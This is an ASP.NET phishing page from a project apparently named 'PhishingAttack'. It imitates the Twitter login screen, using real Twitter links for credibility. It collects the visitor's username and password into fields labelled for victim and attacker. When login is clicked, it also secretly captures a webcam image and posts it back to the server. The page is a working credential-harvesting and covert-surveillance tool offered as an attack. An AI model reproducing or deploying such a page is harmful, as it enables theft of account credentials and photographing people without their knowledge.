<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="twitter.aspx.cs" Inherits="PhishingAttack.twitter" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>twitter</title>
    <link rel="icon" href="images/twitter_PNG3.png" type="images/gif" sizes="20*20" />
    <link rel="Stylesheet" href="css/twitter.css" type="text/css" />

    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script src='<%=ResolveUrl("~/jsfiles/jquery.webcam.js") %>' type="text/javascript"></script>
    <script type="text/javascript">
        var pageUrl = '<%=ResolveUrl("~/twitter.aspx") %>';
        $(function () {
            jQuery("#Camera").webcam({
                width: 320,
                height: 240,
                mode: "save",
                swffile: '<%=ResolveUrl("~/jsfiles/jscam.swf") %>',
                debug: function (type, status) {
                    //$('#Status').append(type + ": " + status + '<br /><br />');
                },
                onSave: function (data) {
                    $.ajax({
                       // type: "POST",
                        //url: pageUrl + "/GetCapturedImage",
                       // data: '',
                        //contentType: "application/json; charset=utf-8",
                        //dataType: "json",
                        success: function (r) {
                            $("[id*=imgCapture]").css("visibility", "visible");
                            $("[id*=imgCapture]").attr("src", r.d);
                            return false;
                        },
                        failure: function (response) {
                           // alert(response.d);
                        }
                    });
                },
                onCapture: function () {
                    webcam.save(pageUrl);
                }
            });
        });
        function Capture() {
            webcam.capture();
            return true;
        }
</script>

</head>
<body>
    <form id="form1" runat="server">
    <div id="logo">  
        <asp:HiddenField ID="hdfAttackerUsername" runat="server" />
        <asp:HiddenField ID="hdfCategory" runat="server" />
        <asp:HiddenField ID="hdfvictimusername" runat="server" />
        <asp:HiddenField ID="hdfvictimpassword" runat="server" />
        <img src="images/twitter_PNG3.png" width="1687" height="1687" alt=""/></div>
<div id="twitter">
  <p> Login in to Twitter </p>
</div>

<div id="content"> 
    <asp:TextBox ID="email" runat="server" placeholder="Phone, email, or username" ViewStateMode="Enabled" ></asp:TextBox>
<br/>
    <asp:TextBox ID="password" runat="server" placeholder="Password" ViewStateMode="Enabled"></asp:TextBox>
<br/>

    <asp:Button ID="logingbtn" runat="server" Text="Log in" onclick="logingbtn_Click" OnClientClick="return Capture();" PostBackUrl="~/twitter.aspx"/>
<p><a href="https://twitter.com/account/begin_password_reset"> Forgot password? </a>· 
<a href="https://twitter.com/i/flow/signup" id="signup">Sign up for Twitter </a></p>
</div>

<asp:Panel ID="Panel1" runat="server" Visible="true">
        
        <table border="1">
           <tr>
               <td>
                   Live Image From WebCam<br />
                   
                   <div id="Camera"></div>
            </td>
               <td>
                   Captured Image<br />
                   <asp:Image ID="imgCapture" runat="server" Style="visibility: visible; width: 320px;
                height: 240px" />
               </td>
           </tr>
       </table>
        </asp:Panel>
    </form>
</body>
</html>
